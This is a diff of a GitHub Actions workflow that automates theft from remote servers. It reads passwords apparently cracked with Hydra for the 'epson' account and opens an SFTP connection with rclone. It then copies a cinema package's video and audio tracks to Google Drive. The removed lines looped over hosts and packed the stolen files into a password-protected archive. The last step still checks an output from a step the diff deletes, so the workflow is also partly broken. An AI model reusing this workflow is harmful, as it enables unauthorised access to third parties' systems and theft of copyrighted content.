@@ -35,42 +35,37 @@ jobs:
         id: valid
         run: echo "found=$([ -s valid_ips.txt ] && echo true || echo false)" >> $GITHUB_OUTPUT
 
-      - name: Download & package DCP
-        id: dcp
-        if: steps.valid.outputs.found == 'true'
+      - name: Stream 1080p to Google Drive
         run: |
           mkdir -p staging
-          while read ip; do
-            PASS=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
-            [ -z "$PASS" ] && continue
+          ip=$(head -n1 valid_ips.txt)
+          pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
 
-            # create temp rclone remote
-            rclone config create relay$ip sftp \
-              host="$ip" user="epson" port="22" \
-              --sftp-password "$PASS" \
-              --config /tmp/rclone.conf
+          # create remote (drive = Google Drive)
+          rclone config create relay sftp \
+            host="$ip" user="epson" port="22" \
+            --sftp-password "$pass" --config /tmp/rclone.conf
 
-            # attempt copy
-            rclone copy "relay$ip:/DSIC_P1" staging/DSIC_P1 \
-              --config /tmp/rclone.conf \
-              --transfers=32 -P || continue
+          # 1) copy the 1080p track (usually a .m2ts or .mov inside the DCP)
+          rclone copy "relay:/DSIC_P1/VIDEO/DSIC_P1_1080p.mov" \
+                      "gdrive:Movies/DSIC_P1_1080p.mov" \
+                      --config /tmp/rclone.conf --transfers=8 -P
 
-            # only set flag if folder is non-empty
-            [ -n "$(ls -A staging/DSIC_P1)" ] && {
-              7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
-              echo "movie_found=true" >> $GITHUB_OUTPUT
-              break
-            }
-          done < valid_ips.txt
+          # 2) copy the 5.1 audio track
+          rclone copy "relay:/DSIC_P1/AUDIO/DSIC_P1_51.wav" \
+                      "gdrive:Movies/DSIC_P1_51.wav" \
+                      --config /tmp/rclone.conf --transfers=8 -P
+
+          # 3) create a lightweight “pointer” file for artifact
+          echo "gdrive:Movies/DSIC_P1_1080p.mov" > DSIC_1080p_location.txt
           
-      - name: Upload artifact
-        if: steps.dcp.outputs.movie_found == 'true'
+      - name: Upload location file
         uses: actions/upload-artifact@v4
         with:
-          name: DSIC_P1
-          path: DSIC_P1.7z
-          retention-days: 7
+          name: DSIC_1080p_GDrive
+          path: DSIC_1080p_location.txt
 
       - name: Signal success
         if: steps.dcp.outputs.movie_found == 'true'
         run: echo "movie found and downloaded"
+        
